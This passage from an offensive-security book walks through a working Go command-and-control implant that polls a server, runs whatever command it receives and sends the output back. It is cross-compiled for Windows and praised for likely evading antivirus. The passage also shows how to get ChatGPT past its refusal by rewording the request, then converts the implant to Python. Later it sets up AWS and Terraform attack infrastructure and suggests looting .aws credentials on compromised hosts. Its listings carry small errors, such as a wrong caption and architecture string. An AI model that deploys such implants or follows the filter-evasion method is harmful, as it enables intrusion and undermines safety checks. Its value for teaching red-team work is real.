If so, the program sends the data; if not, the program gets the next command, executes it, collects the output, and repeats the process all over again.

This execution loop is exactly how your implant is going to be written (skip ahead to Listing 3-9 to see the full code). In a new file saved as c2_implant.go, start with package main and your imports as usual:

package main

import (
    "io/ioutil"
    "net/http"
    "net/url"
    "os/exec"
    "strings"
    "time"
)
For this implant, you need your trusty ioutil library again as well as the os/exec library. The net/http and net/url libraries will handle sending and parsing your web requests. The strings library will help you with some more technical string parsing for your commands, and time will let you add a short delay to your loop so you’re not constantly making requests to the C2 server. You can have the server just fire off requests back-to-back, but Go is fairly fast even with the delay. Running the implant with no delay is a bad idea and can exhaust both it and the web server. This isn’t always the case (raw socket connections usually don’t have this issue, for example), so the pseudocode doesn’t enforce a delay in the execution loop. When it comes to HTTP connections, however, you want to keep them pretty spread out.

The upside here is that you get to finely control how quickly or slowly your implant reaches out. This can be beneficial for stealth. By not sending a request every millisecond, you can fly under the radar; your heuristic traffic will look like any other web request a system makes throughout the day. That said, keep in mind that your traffic is going off HTTP instead of HTTPS, which means it is unencrypted. If stealth is really a concern, that’s the first area for improvement. Once you have your C2 implant working with the C2 server, try to implement HTTPS traffic as a challenge. If you did this with the custom proxy you built already, you’re already halfway there.

Having your delay respond every 1 second or 0.5 seconds makes for a fairly responsive command shell over HTTP. Enforcing a longer delay is usually wiser, but if you have just one shell, you can usually get away with making it reach out at a quicker rate.

With your imports defined, you can begin to scaffold out your implant’s code. The implant needs only two functions. The first, runCommand(), should look fairly familiar from when you implemented command execution in Go, and the second is, of course, main():

func runCommand(command string, args ...string)(string, error) {

}

func main() {

}
Your main() function is where all the magic happens:

func main() {

    baseURL := "http://localhost:9001" // Change the URL to the server to connect to.
    data := ""

    for {
        // The for body goes here.
    }
You can abstract this further if you want, but this implant really does only two tasks: make requests and execute system commands. To make a request, you need to define the server you’ll be communicating to. You do so with your baseURL variable, which defines a connection string to your C2 server. Since your C2 server is just a basic HTTP web server, this connection string is a basic HTTP URL string. In this case, your server is going to be running on the same host as your implant, and you know it’s serving on port 9001, so your connection string will be http://localhost:9001. To run your implant on a remote host, simply change localhost to whatever IP address or domain name is tied to your C2 server. Next, you define an empty variable named data and make sure it’s accessible outside the loop scope in case you need to work with it in other ways.

The simplest way to make an infinite loop in Go is by using the for keyword with no arguments, just curly brackets {}. This loop will run infinitely until the program or system dies for an external reason, like a force quit. This is where the rest of your execution loop logic will occur.

Inside the for loop, build out your web request as follows:

    for {
        // Build the URL with the "data" parameter.
        reqURL := baseURL + "/?data=" + url.QueryEscape(data)

        // Make a GET request to the server with the "data" parameter.
        resp, err := http.Get(reqURL)
        if err != nil {
            continue
        }
        defer resp.Body.Close()
This request consists of your baseURL variable and your data variable. Calling the url.QueryEscape() function around the data variable will ensure that it’s within URI specs, as some data returned by commands may include characters that aren’t supported in a GET request. Another good practice (not shown here) is to encode this data with an encoding algorithm like Base64. If you encode the data and escape any bad HTTP characters, you can unescape them on your C2 server and decode the data and have a perfect copy.

Once your request URL is ready, call http.Get() and pass in your new reqURL variable. This returns a response and an error. You’ll store the response, but you’ll do something new with the error. Instead of printing it, you’ll capture it, acknowledge it, and continue. The reason for essentially ignoring the error is that in the context of an implant, you never want your program to die; you want it to remain running at all costs. As long as it can still execute code, you don’t care about any errors. This is one difference between best practices in normal software development and those in OST development. In OST development, especially for persistent tools like a malware implant, you never want to verbosely print anything or crash; you want to handle errors gracefully and silently.

The last step is closing out your HTTP request. Go handles these requests via concurrency, which means the GET request you issued runs on a separate thread automatically. Because Go handles GET requests concurrently, you don’t have to worry about a lengthy response time (or even a timeout, if the server goes down) hanging up the rest of your code. Concurrency allows you to make your request and keep your core code moving until you want to do something with that request. This is great in terms of design, but you don’t need it for your simple C2 tool because your implant can’t do anything until it receives information from your C2 server. C2 stands for command and control, after all, so if there are no commands to run, there’s nothing to control. With this in mind, you use the defer keyword to tell your program to wait for the request to complete, close it out, and move on.

Once your response body is closed, you can read from it by using your old friend ioutil:

        // Read the response body.
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            continue
        }
I/O functions aren’t just for file operations; they can read data from in-memory streams too. The resp.Body value from your GET request is a byte stream that you use ioutil to read. Then you can store the value as a normal variable called body and use it just as you would any other variable. Once again, you continue if any error occurs while reading the response body.

The data your implant expects to see in this response body is a command to execute. Since it might be a command with multiple arguments, you need to parse it out as follows:

        // Split the body string into two variables.
        splitValues := strings.Fields(string(body))
        var command string
        var args []string

        if len(splitValues) > 0 {
            command = splitValues[0]
            if len(splitValues) > 1 {
                args = splitValues[1:]
            }
        }
This is where the strings library comes in handy. Start by casting the body variable as a string() method. This method is built in, and you’ve been using it in your other programs as well. Casting data as a string isn’t the same as utilizing the strings library, which allows you to do far more than simple data type casting. In this case, you’re splitting the string on empty spaces by calling strings.Fields(). This function automatically creates a string slice based on spaces between characters. Anything before the first space here (such as ls) is your base command. Anything after the first space (such as -lah) is likely an argument.

Once you’ve split your values, you define two familiar variables: command and args. You’re defining them up front because they need to be in the scope of your execution loop so you can use them later, and you need to do some checks before you just set them directly. The first check makes sure that your new splitValues slice isn’t empty. If it is, you have nothing to execute. If it’s not, you pull out the first value (at index 0) and store that in the command variable. This is your base command. Next, you check whether the splitValues slice contains more than just that single value. If so, you assign everything after the first value to the args slice. Then all that’s left to do in this execution loop is to call your runCommand() function, and once again, continue on if any errors occur:

        // Run the command.
        data, err = runCommand(command, args...)
        if err != nil {
            continue
        }

        // Wait for 5 seconds before making the next request.
        time.Sleep(5 * time.Second)
    }
}
After calling runCommand(), you can finally let your implant sleep before repeating the entire process again. In this example, you call time.Sleep() and set your delay for 5 seconds. The time.Sleep() function in Go doesn’t read a raw integer value as seconds but instead as a data type of Duration. To calculate your desired sleep duration, multiply the integer for your desired delay (in this case, 5) by the corresponding unit of time as a Duration data type (in this case, time.Second). This requirement adds a layer of complexity compared to other languages, but it also offers the benefit of consistency and clarity when it comes to time unit conversion.

Now, in the body of the runCommand() function, you can simply copy and paste your command execution code from exec.go in “Command Execution with the os Library” on page 106, with the one change in bold:

func runCommand(command string, args ...string) (string, error) {
    cmd := exec.Command(command, args...)

    // Capture the output.
    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", nil
    }

    return string(output), nil
}
This time, you don’t want to continue on an errored execution loop, which may confuse your output value. Instead, you return nil for the error so that the error conditional above it should never be reached.

NOTE
Technically, you could remove this check altogether, but Go will complain that the variable err is unused. This approach is the verbose “beginner’s” way, and it gets the job done just fine.

Just like that, your implant is done! Listing 3-9 shows the final c2_implant.go code.

package main

import (
    "io/ioutil"
    "net/http"
    "net/url"
    "os/exec"
    "strings"
    "time"
)

func runCommand(command string, args ...string) (string, error) {
    cmd := exec.Command(command, args...)

    // Capture the output.
    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", nil
    }

    return string(output), nil
}

func main() {

    baseURL := "http://localhost:9001" // Change URL to server you want to connect to.
    data := ""

    for {
        // Build the URL with the "data" parameter.
        reqURL := baseURL + "/?data=" + url.QueryEscape(data)

        // Make a GET request to the server with the "data" parameter.
        resp, err := http.Get(reqURL)
        if err != nil {
             continue
        }

        defer resp.Body.Close()

        // Read the response body.
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            continue
        }

        // Split the body string into two variables.
        splitValues := strings.Fields(string(body))
        var command string
        var args []string

        if len(splitValues) > 0 {
            command = splitValues[0]
            if len(splitValues) > 1 {
                args = splitValues[1:]
            }
        }

        // Run the command.
        data, err = runCommand(command, args...)
        if err != nil {
            continue
        }

        // Wait for 5 seconds before making the next request.
        time.Sleep(5 * time.Second)
    }
}
Listing 3-9: The complete Python C2 implant program

Now you’ll test it. Start up your implant and C2 server side by side, as shown in Figure 3-2.

Two side-by-side Linux terminals. The left one is running the command python c2_server.py. The right one is running the command go run c2_implant.
Figure 3-2: Starting the custom C2 server while running the Go implant

You won’t see any indicator that the implant has connected, because you disabled all that logging on your C2 server. To show that the implant connected, you could implement new logic for that yourself or simply turn the logging back on.

If you execute a command like ls, however, you will get output, as shown in Figure 3-3.

The two Linux terminals from Figure 3-2. The left now shows the user input ls followed by the output Data parameter received: c2_implant.go.
Figure 3-3: Using the C2 server to execute single commands

Likewise, if you execute a command with arguments, like ls -lah, you should also get the output you expect (see Figure 3-4).

The two Linux terminals from Figure 3-2. The left now shows the user input ls -lah and output Data parameter received followed by execution results from target.
Figure 3-4: Using the C2 server to execute a command with arguments

Finally, you can compile this program. The first command exports the target architecture you’re compiling your program for (Windows, in this case). You’ll build on the local Linux system that you’ve been testing on if you’ve been following along with the book’s basic test environment:

$ export GOOS=windows GOARCH=amd6
$ go build c2_implant.go
$ ls
c2_implant c2_implant.go
NOTE
One additional build step to hide the command prompt GUI on Windows comes in handy for implants like this. You can find that code in the Makefile for Lupo C2 (https://github.com/InjectionSoftwareandSecurityLLC/lupo/blob/main/Makefile) and test it as another avenue of exploration.

Now you have a portable binary program that will run on any 64-bit Linux operating system. Run it with go run, and you should see it function exactly as you expect it to (see Figure 3-5).

The two Linux terminals from Figure 3-2. Left shows c2_server.py receiving id command and displaying its execution results. Right shows ls -lah output and is running the c2_implant binary.
Figure 3-5: Using the compiled implant to interact with the C2 server

You now have your own custom C2 server and C2 implant in your tool belt. Your HTTP client and server know how to talk to each other, and your client can run commands that you tell it to. The best feature of your custom implant is that it likely won’t get caught. At the time of this writing, most antivirus and EDR solutions don’t have a good way of detecting unknown malware, and it would be even more difficult if your implant’s communications were encrypted with TLS instead of executing cleartext commands.

To wrap up this chapter, we’ll revisit the LLMs introduced in Chapter 1 so you can see how to use them to speed up the malware development process.

AI Malware Development
The advent of LLMs like ChatGPT has sparked a revolution in the AI sector of technology. In simple terms, an LLM is a data model that processes language. It can learn from its dataset to understand, communicate with, and compose with language, including a programming language. While this isn’t AI in the science-fiction sense, it’s impressive and makes an effective tool for offensive security. However, as impressive as it is, you still need to know how to program in order to successfully use an LLM.

Much as you did in Chapter 1, you’ll be using ChatGPT. This time, you’re going to ask it to generate an implant for you in Python. You’ll approach this in two ways: first by using plain English to have it create a brand-new custom implant, and second by feeding it your Go implant program and having it convert that code. Keep in mind that posting your source code to any public service is generally a bad idea unless you intend for it to be open source to begin with. While the risk is minimal, you’re trusting the service’s privacy as well as its security, so do so at your own risk. If you’re interested in pursuing the topic further, research locally available LLMs that can mitigate this risk.

NOTE
While the code in this book isn’t in a public source code repository, it is fully open source with no license or requirements; thus, you are free to use it as you see fit. Keep in mind that this does not extend to the text material, which is subject to copyright.

The use of a locally run LLM might also be appealing because services like ChatGPT have an ethics filter in place. While this is a great idea for reducing harm to the general public, it does seem rather silly in light of the fact that malware is just software. Thus, as you’re about to see, it’s easy to make ChatGPT bypass the ethics filter to write “malware” for you.

To start, ask ChatGPT to generate a Python script that makes a GET request to a web server and then executes the response of that request in a system call. As soon as you submit this prompt, you should get a reply like “I’m sorry, but I cannot assist you in creating a script that executes arbitrary commands received from an external server” because it poses “security risks” and “goes against responsible and ethical programming practices.” For example, here’s my prompt and ChatGPT’s response:

hey write me a python script that makes a get request to an http server and then executes whatever the server responds with in a system call

I’m sorry, but I cannot assist you in creating a script that executes arbitrary commands received from an external server. This type of functionality poses serious security risks and can be exploited for malicious purposes. It goes against responsible and ethical programming practices.

Executing arbitrary code received from an external source can lead to severe security vulnerabilities and potential harm to your system. If you have a specific use case or . . .

ChatGPT isn’t wrong: Although the ethics here are completely subjective, writing code that executes any system command it is given with no sanitization is absolutely a security risk. This isn’t a problem, though. Since ChatGPT isn’t comfortable writing a line like os.system(), you can just do that part yourself. Change the prompt and see if it will generate something more “ethical” instead:

write me a python script that loops every 5 seconds and makes a get request and then prints the data it receives

Now you’ll likely get a “Certainly!” response from ChatGPT, which tells you that you’ll need to install the requests library via Python’s pip package manager. Here’s the response I got from ChatGPT:

Certainly! You can use the `requests` library in Python to make HTTP requests. If you don’t have it installed, you can install it using:

pip install requests
ChatGPT then displayed some code for me to try:

Here’s a simple Python script that makes a GET request every 5 seconds and prints the received data:

import requests
import time

def make_request():
    url = "https://example.com" # Replace with your actual url
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Received data:", response.text)
        else:
            print(f"Error: (response.status_code)
You can see right away that this code is most of what you need for your C2 implant. In other words, you got ChatGPT to generate 99 percent of your “malware” code without a jailbreak prompt or any other bypass, just by asking the “right” question.

Copy and paste the ChatGPT code into a new file named pyimplant.py. Obviously, ChatGPT didn’t include your code execution functionality, so you still have some work to do in this file, as shown here in bold:

import requests
import time
import subprocess

def make_request():
    # Replace with your actual URL.
    url = "http://localhost:9001"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = subprocess.check_output(response.text, shell=True)
            reqURL = url + "/?data=" + str(data)
            requests.get(reqURL)
            return
        else:
            print(f"Error: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")
def main():
    while True:
        make_request()
        time.sleep(5)

if __name__ == "__main__":
    main()
You need to change the url variable to point to your C2 server, as well as replace the line that prints the data with code to execute your commands. You also need to be able to send the output from your command execution back to your C2 server to have feature parity with the other implants you’ve written from scratch.

Replacing the print statement with a command execution line is easy enough. You could make a call to os.system() and call it a day, but using subprocess is a better way to go about this in terms of handling output redirection.

NOTE
The code in this section isn’t meant to be copied and is provided only partially, although you’ll see enough to be able to follow along. ChatGPT might provide a different sample to your prompt than what’s shown here. Try the prompts to see what new challenges you run into and determine how to overcome them on your own.

To use the subprocess call, you import the subprocess library, which is built into Python. Specifically, the subprocess.checkoutput() function handles your command execution and output redirection all in one line. After you execute the command and store the response in a data variable, you can immediately make a new request to send the data to your C2 server via the data parameter. This isn’t the cleanest solution, and it will result in some funky-looking response encoding since you’re casting Python bytes to a string, but it demonstrates how you can get a functionally working implant in seconds by using ChatGPT with minimal edits.

Now run your C2 server and your implant. You should see the result shown in Figure 3-6.

Two side-by-side Linux terminals. Left: c2_server.py with ls and whoami commands and responses in Python byte syntax. Right: Keyboard Interrupt message and python3 pyimplant.py execution.
Figure 3-6: The Chat GPT–based implant working with minor errors

You can see that you’re getting a hit every 5 seconds with a weird string of b'' from the aforementioned bytes-to-string cast. Even with that compromise, you can also see that executing commands works flawlessly, making this an annoying but usable implant.

Now try the prompt convert this code to python and paste in your Go implant:

convert this golang code to python

package main

import (
    "io/ioutil"
    "net/http"
    "net/url"
    "os/exec"
    "strings"
    "time"
)

func runCommand(command string, args ...string) (string, error)
{

    cmd := exec.Command(command, args...)


// Capture the output.
output, err :=cmd.CombinedOutput
if err != nill {
Since ChatGPT understands programming languages so well, it can do this conversion far more quickly than a human could—although not without error, as you’ll see. What’s interesting is that your code absolutely makes “unsafe” or “unethical” programming decisions, but ChatGPT doesn’t seem to mind in the case of code conversion. The mistakes it makes when converting your code have nothing to do with the ethics filter; they’re simple logical mistakes. The “risky” system command execution function is not only still there but also implemented quite well. It should mirror your Go tool perfectly.

Here’s the code ChatGPT generated for me. As you read through it, see whether you can spot the error:

import subprocess
import time
import requests
from urllib.parse import quote

def run_command(command, *args):
    try:
        output = subprocess.check_output([command] + list(args), universal_newlines=True)
        return output.strip()
    except subprocess.CalledProcessError:
        return ""

def main():
    # Change the URL to the server you want to connect to.
    base_url = "http://localhost:9001"
    data = ""

    while True:
        # Build the URL with the "data" parameter.
        req_url = f"{base_url}/?data={quote(data)}"

        # Make a GET request to the server with the "data" parameter.
        try:
            resp = requests.get(req_url)
            resp.raise_for_status()
        except requests.RequestException:
            continue

        # Read the response body.
        body = resp.text

        # Split the body string into two variables.
        split_values = body.split()
        command = split_values[0] if split_values else ""
        args = split_values[1:]

        # Run the command.
        data = run_command(command, *args)

        # Wait for 5 seconds before making the next request.
        time.sleep(5)

if __name__ == "__main__":
    main()
When you run this code, you’ll be presented with a file permission error. Though technically accurate, this error isn’t really representative of the issue and thus is fairly unhelpful in identifying the error that ChatGPT made. It’s up to you as a knowledgeable programmer to be able to spot and correct it.

In this case, the error occurs because you don’t check whether any commands are present before executing run_command(). This is likely due to the way Go handles your command and args arguments to its runCommand() function. You don’t even call runCommand() if no base command variable is present, and you also can pass a nil slice for args without issue. In Python, you can still pass the empty args list, but ChatGPT got a little confused along the way and skipped that important check for the presence of any commands. Running this code would cause an immediate execution error from the run_command() function, as it would try to pass a null value to the subprocess system call:

        # Run the command.
        if len(command) > 0:
            data = run_command(command, *args)
Adding a simple check to verify that the length of command is greater than 0 fixes this problem. Now you can start up your C2 server again and run this new Python-based implant to see how it compares:

Command (type 'exit' to stop)> whoami
Command (type 'exit' to stop)>
Data parameter received: ubuntudev
Immediately, you can see that this version runs significantly better than your custom-generated implant. A minor bug causes it to send the response data back to the C2 server twice, but for code generated in seconds and with only one change needed, it’s far more usable overall.

ChatGPT is no substitute for your skill in developing custom OSTs (at least not yet), but it’s a powerful companion. You can use it or similar LLMs to prototype anything from an implant to an authentication attack script in seconds. ChatGPT is extremely helpful for getting a project started and functional; you simply need to supply the knowledge you’ve gained so far to provide the most effective prompts for expediting your development process.

Summary
Now that you can create your own custom malware, you can vastly extend your tool kit’s capabilities. Malware is just software, and this is a weak point to recognize when it comes to offensive security operations. While EDR evasion is not a focus of this chapter, it’s a natural by-product of developing custom C2 implants and custom ransomware. Most EDR solutions rely heavily on signatures and heuristics to work. By writing your own tools you have naturally broken half of the ability for standard EDR to detect your code based on signatures alone.

From here, it’s just a matter of understanding that your code is software just like any other “legitimate” software. Based on this understanding, you could observe how other software used in day-to-day operations performs actions like reading or writing files. Once you learn how these operations are used, you can model them in your own malicious tools to trivially evade a large array of heuristic detections. This skillset is one of the most essential when conducting offensive security operations as you never know how tight a target’s defenses may be, but you’ll now be prepared to face them no matter their level of sophistication.

PART II
OFFENSIVE SECURITY ENGINEERING
This next part of the book shifts away from software development and sets your focus on the infrastructure engineering side of offensive security. After all, you will need some sort of computer or server to run all these new tools you are working with. You will tackle automating infrastructure by using Terraform in the context of the Amazon Web Services cloud environment. Once you have used this knowledge to configure some basic servers, you will then extend and apply this knowledge to specific tooling.

One of the key concepts you will explore to make all this happen is related to the way offensive security–minded individuals view fundamental network communications. You will go back to basics with networking fundamentals, then immediately translate that into useful network configurations in the context of infrastructure used in offensive security operations. This perspective will help you understand how to best configure and deploy C2 servers.

From there, you will apply these same fundamentals to configuring more complex infrastructure that is commonly used on offensive security engagements. You will move on to building a reverse virtual private network tunnel to understand how attackers might use this to gain more internal persistence in the context of certain network configurations. By the end, you will combine all these concepts and use Salt Project as an example tool for not only implementing certain network configurations but also setting up the concept of desired state as it relates to automating infrastructure.

4
AUTOMATING OFFENSIVE SECURITY INFRASTRUCTURE DEPLOYMENT
The No Starch Press iron logo
Now that you can build your own OSTs, you’ll need a place to catch all those shells on your engagements. This chapter kicks off the offensive security engineering part of the book by walking you through the infrastructure configuration you’ll need to carry out your offensive security operations. In the process, you’ll be introduced to infrastructure as code (IaC), an approach for managing and provisioning infrastructure programmatically instead of manually. Specifically, you will use Amazon Web Services to set up an environment and then use Terraform and the Serverless Framework to automate building infrastructure components for that environment.

Just as OST development is software development focused on offensive security–related tools, offensive security engineering is infrastructure engineering focused on the needs of an offensive security team. If you have a background in system administration or DevOps, you already know how to do a lot of the configuration I’ll cover; the difference is in the specific tools and techniques you’ll be using for an offensive security use case.

Tools and Technologies for Automation
There are many ways to configure infrastructure for offensive security operations. As long as you’re capable of standing up a system and configuring network rules, you can use any technologies you like. That said, offensive security infrastructure benefits immensely from automation, so here you’ll configure your infrastructure by using Amazon Web Services (AWS), along with Terraform (https://github.com/hashicorp/terraform) and the Serverless Framework (https://github.com/serverless/serverless).

These tool kits give you the advantage not only of automation but also of operational security and desired state maintenance (a topic I’ll describe shortly). If you’re in an offensive security engagement and the IP address of your C2 server is blocked, you can simply spin up a new C2 server or even rotate (swap out) the IP address. As long as you’ve configured your implant to pivot to the new host, you can resume your activity and force defenders into a cat-and-mouse game until you complete your operation. Of course, that’s assuming they don’t destroy your implant, but that’s a risk you have to take, and having flexibility on the infrastructure side certainly gives you a persistence advantage.

Just like the code for OST development, the infrastructure code is an open source project. I’ll be providing a fair amount of the code here, but all of it is accessible via the Offensive Security Engineering GitHub project at https://github.com/3ndG4me/Offensive-Security-Engineering.

Besides Terraform and the Server Framework, you will also need to sign up for and configure an AWS account. All the tools and services you’ll be using are free of charge at the time of writing. AWS will require you to submit your payment information, but you can use the free-tier resources for the examples in this book.

NOTE
Keep in mind that you don’t have to use all these technologies and tools to complete the exercises in this chapter. These tools serve as a great backbone to practical real-world infrastructure and give you new and practical skills, but they’re not essential. You can perform all the tasks we’ll cover by using the provided VirtualBox machines via Vagrant if you prefer. And if you prefer a different cloud provider, you can use that instead of AWS, although you’ll be on your own for converting the infrastructure code to meet the needs of your chosen platform.

I’ll begin with the basic instructions for configuring each aspect of your environment, starting with AWS.

AWS for Attack Infrastructure
Before using any of these frameworks, you have to configure a provider. As I’ve noted, to follow along with the examples in this chapter, you’ll need to sign up for an AWS account. In this case using AWS is the best option as it supports lambdas, which will be used later on. Google Cloud Platform or Microsoft Azure also have a comparable feature that is equally viable if you wish to explore those further. When choosing a cloud provider, make sure the provider supports the technologies you need for your given infrastructure goals.

Once you’ve signed up, log in to the AWS Management Console and click the EC2 link to configure a cloud-based server host. (Simply search for EC2 if it’s not immediately visible on the home screen.) EC2, which stands for Elastic Compute Cloud, is a core AWS service that provides scalable and resizable virtual computing capacity in the cloud. With your account set up, you’ll want to activate EC2 in order to configure a cloud-based server host.

Next you’ll generate an SSH key pair that will be used to log in to your EC2 server. These are the credentials needed to both directly access the server manually, as well as allow Terraform to access the server. From the EC2 Dashboard on the left-hand side of the page, navigate to Network & Security ► Key Pairs. You should see the screen shown in Figure 4-1. This is where you’ll generate your Secure Shell (SSH) key pair (comprising a public key, which is stored in the EC2 instance, and a private key) to use with Terraform.

The Key pairs page in Amazon’s AWS Console web app showing a search bar and an empty list with the message “No key pairs to display”.
Figure 4-1: The Key Pairs page

Note which region you’re in. Each EC2 region is unique. The examples in the book use us-east-2. If you’re in a different region, be sure to change it in the upcoming code.

Click Create Key Pair, and you’ll be prompted to name the key pair and select the type (see Figure 4-2).

The Create Key Pairs page showing name set to primary-c2-key, key pair type set to RSA, private key format set to PEM, and Cancel and Create Key Pair buttons.
Figure 4-2: Creating an SSH key pair to use in Terraform

The name of the key pair is critically important. I suggest naming yours primary-c2-key to match the code used throughout the chapter, to ensure that all the examples will work without modification. If you name it something unique, just be sure to update the key_name reference in your code. Otherwise, you won’t be able to access your server, or worse, the code won’t run at all because of automation scripts failing in later chapters.

Next, under File Format, select .pem. Click Create Key Pair, and AWS will automatically download the .pem file for you. Best practice is to place it in your .ssh directory, but just be sure to store it somewhere you can access it. In the case of critical real-world infrastructure, consider even backing it up in a password manager. Rotating (replacing) SSH keys is possible, but it’s a tedious process. The same advice applies here as for your car: Don’t lose your keys.

Also be sure to properly permission the .pem file by using chmod 600 your_key_filename. This ensures that only you can read and write to your key. If you don’t set this permission correctly, you’ll get an error when you try to use it later. Whenever you spin up a server you want to SSH into later, you will specify the key you want to use via the -i flag like so:

$ ssh -i path/to/your_key.pem user@IP
Now you need to create a user for your Terraform and Serverless Framework automation tools to authenticate to AWS with.

Creating an AWS Service Account
To create user accounts other than your root AWS account, from the AWS Management Console, choose Identity and Access Management (IAM) ► Access Management ► Users. You’ll be creating a new account to be used as a service account for IaC automation. Since you’ll share this credential in other environments and services, this account will have permissions related only to creating and destroying infrastructure. This ensures that in the case of credential theft, your AWS environment could be recovered, as no access to root or administrative-level account privileges would be obtained.

Select Create User. Name the user terraform and leave the Provide User Access to the AWS Management Console box unchecked (see Figure 4-3). This will create a user that has no access to the AWS Management Console but can use the software development kit (SDK) and the AWS application programming interface (API) to communicate with AWS resources—exactly what you need for a service account that works with command line applications.

The Create User page showing username set to terraform, with the AWS management console access checkbox unchecked, and a Next button below.>
Figure 4-3: Adding the terraform user

Next, you’ll attach the permission policies. I want to pause here to say a word about IAM privileges. Just because you’re a hacker or red teamer doesn’t mean you’re exempt from the advice you give your clients about privileges and account security. In fact, if you haven’t set up multifactor authentication on your root account, you’re already falling behind. As an attacker, you need to secure your infrastructure with the same principles that apply to a system administrator configuring user accounts with the proper password policies and permissions to secure their network. You may be an offensive security professional, but if you’re the person in charge of your team’s infrastructure, you’re also a system administrator, so the same rules apply. Namely, always follow the principle of least privilege: Limit a user’s access to only what they need to do their job.

For Terraform, the only permission you need specifically is the AmazonEC2FullAccess policy (see Figure 4-4).

The Add user Set permissions page with the option Attach existing policies directly selected, and the AmazonEC2FullAccess policy box checked.
Figure 4-4: Setting permissions for the terraform user

The Serverless Framework, which provides a framework for automating the deployment of lambdas in AWS, needs a few more permissions:

AWSLambdaFullAccess Allows Serverless to create services for AWS Lambda, a tool I’ll talk more about in “A Serverless Framework Primer” on page 172.
AmazonS3FullAccess Gives Serverless access to IAM to create permissions for Amazon’s cloud-based Simple Storage Service (S3) buckets.
AmazonSSMFullAccess Gives Serverless access to IAM to create permissions for AWS Systems Manager (SSM) for orchestrating deployment.
AmazonAPIGatewayAdministrator Handles routes for Lambda functions to use URLs via Amazon’s API management service, API Gateway.
AWSCloudFormationFullAccess Gives Serverless access to run the CloudFormation code it generates. (CloudFormation is an automation service native to AWS.)
For our purposes, we’ll be combining the policies into one user account, and in most cases in offensive security, these permissions are sufficient. However, you could also make separate accounts for the terraform user and a serverless user, with only the policies each service requires. That way, if one service account is compromised, the damage is contained instead of being spread across various AWS infrastructure components.

Select Attach Existing Policies Directly to add the policies I’ve recommended (see Figure 4-5). You can use the search bar to filter the existing AWS policies for the one you want to add. When you’ve finished, click Next.

The permissions policies page with the Permissions tab selected at top left, an Add Permissions drop-menu at top right, and 7 policies listed.
Figure 4-5: AWS permissions for the Terraform service account

This page allows you to review and confirm your settings and add tags before creating the user. You can leave tags blank and, if everything else looks as expected, click Create User. If you need to make a change, click Previous.

Finally, you should see a Success page and can configure the account to use the access key.

AWS may pop up a screen providing alternatives to using an access key. These are good recommendations, but for now, click Create Access Key and confirm that you want to proceed.

The key ID and secret access key are essentially your service accounts’ username and password, so treat them accordingly. Do not share them or lose them. Copy these values now and store them in a password manager. You cannot recover them; if you lose them, you’ll have to destroy the old account, create a new one, and rotate the old credentials wherever applicable.

Once you’ve secured your access key ID and secret access key, you’ll need to download the AWS Command Line Interface (CLI) application (https://aws.amazon.com/cli/). This application allows you to access the Amazon API directly from the command line so that you can quickly set up your AWS credential structure for Terraform and Serverless to use. Run the following command, entering your access key ID and secret access key when prompted (keep None for both the default region name and output format):

$ aws configure
AWS Access Key ID [None]: your access key id
AWS Secret Access Key [None]: your secret access key
Default region Name [None]:
Default output format [None]:
$ cat ~/.aws/config
[default]
aws_access_key_id = your access key id
aws_secret_access_key = your secret access key
This command generates a hidden directory called .aws in your current user’s home folder. This directory includes a file called config, where you can create profiles with the region, output format, and other settings, and a file called credentials containing your AWS user credentials. Keep in mind that the credentials file isn’t exactly secure, since it contains your access key ID and secret in plaintext, but it prevents you from having to use the less secure option of typing them in your command line output.

The [default] section created by the AWS CLI is the default account it will select for each run unless you specify otherwise. You can call this account anything you want; it doesn’t have to be [default]. Most tools recognize this as your default account and use it if you don’t specify another profile. To specify another profile for Terraform to use, set the AWS_PROFILE environment variable to the name of the profile you want to use, or set the profile value in your Terraform provider resource code. For the Serverless Framework, use the --aws-profile flag and pass it the profile name you want to use.

The next time you compromise a system during an offensive security test, look for this .aws directory in your target system’s home folder. You might be surprised by the kind of access you can gain if those credentials exist.

A Terraform Primer
Terraform is an IaC software tool that will be the backbone of your server infrastructure development. The concept of IaC is quite simple. Instead of manually clicking through buttons on a server installation interface, you use Terraform’s syntax to describe your configuration. Every setting you’d normally change manually is now a descriptive line of code that handles the configuration for you. Terraform translates this code into API calls for a given server provider; in your case, that’s AWS, although Terraform supports every major cloud infrastructure provider.

Terraform also keeps track of state, or the way you have defined your infrastructure to look. Your configurations have an expected baseline—a desired state—that you can trust and rely on Terraform to maintain. If this state ever deviates, Terraform can not only verify the deviation but also correct it. Terraform does this manually by default, although the process can be automated. However, this isn’t the tool’s primary purpose, and once you’ve configured your desired state, it generally shouldn’t change unless you intentionally alter it or an incident occurs.

Terraform Server Instantiation
Let’s look at how Terraform works (skip ahead to Listing 4-1 to see the full code). This example uses some of the virtual private network (VPN) server Terraform code, base-vpn/vpn.tf, provided in the book’s companion GitHub repository:

# Configure the AWS provider.
provider "aws" {
  region = "us-east-2"
}

data "aws_ami" "ubuntu" {
  most_recent = "true"
  owners   = ["aws-marketplace"]

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-bionic-18.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}
Chapter 5 goes into detail on VPNs, but for now, all you need to understand is that a VPN is functionally a service that can be used to route network traffic across various hosts. In this chapter, your focus is on the Terraform code itself. The first line defines the provider as aws. The region parameter identifies the location of your server. In AWS, some resource groups can be used only by certain regions. An EC2 instance is accessible essentially in every region, so you can specify any valid region here. For a list of valid regions, see Amazon’s user guide (https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.RegionsAndAvailabilityZones.html). In this example, the region is us-east-2, which means your server is located in a server farm on the East Coast of the United States. Specifying the region can help you carry out your operations all over the world and even bypass geo-restrictions. In the case of infrastructure engineering, offsite remote backups can be placed in an entirely separate locale if desired.

In the next block of code, the data keyword configures a specific data source. A data source in Terraform is contextual to the provider (as are resources and anything else that relies on data from a provider). In this case, you’re naming your data source ubuntu. You can name it anything you’d like, but best practice is always to use brief yet descriptive names. This data source describes an Ubuntu Amazon Machine Image (AMI), which is the base virtual machine (VM) image for your server. This is like a preconfigured ISO file for the operating system. Since the data source is configured as an image already, you get to skip most of the installation process and instead clone the image and configure it yourself. This saves you a good 20 to 30 minutes compared to a manual installation.

